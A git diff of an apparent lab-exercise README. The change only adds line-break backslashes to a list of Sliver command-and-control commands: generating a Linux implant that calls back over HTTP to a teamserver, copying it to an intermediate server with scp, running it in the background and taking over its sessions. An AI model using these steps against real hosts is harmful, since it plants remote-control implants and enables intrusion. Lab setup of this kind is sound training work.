@@ -3,9 +3,9 @@ All the commands and files needed to set up the exercise, reminder that this exe
 
 Make sure to run `sudo systemctl start sliver.service` to get Sliver working
 
-Commands used:
-Generate Sliver Implant: `generate --os linux --arch arm64 --name [Implant Name] --http [IP of Teamserver]`
-Copy over to Intermediate server: `scp [Implant Name] Intermediate@[IP of Intermediate Server]:/home/Intermediate/Documents`
+Commands used:\
+Generate Sliver Implant: `generate --os linux --arch arm64 --name [Implant Name] --http [IP of Teamserver]`\
+Copy over to Intermediate server: `scp [Implant Name] Intermediate@[IP of Intermediate Server]:/home/Intermediate/Documents`\
 Run Implant: `./[Implant Name] &`
 View sessions: `sessions`
 Use the Implant: `use [session number]`
